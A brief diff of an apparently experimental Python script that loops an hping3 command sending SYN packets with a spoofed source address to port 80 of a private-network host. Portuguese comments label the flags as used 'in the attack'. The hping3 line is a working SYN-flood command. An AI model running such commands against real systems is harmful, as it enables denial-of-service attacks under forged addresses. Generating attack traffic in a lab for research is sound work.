@@ -4,7 +4,7 @@ now = time.perf_counter()
 
 time.sleep(30)
 
-for j in range(25):
+for j in range(30):
   subprocess.call('hping3 -c 100 -S -p 80 -i u20000 -a 172.20.1.3 172.20.1.2', shell=True)
   # -c: Numero de pacotes enviados.
   # -S: Flag utilizada no ataque (SYN).
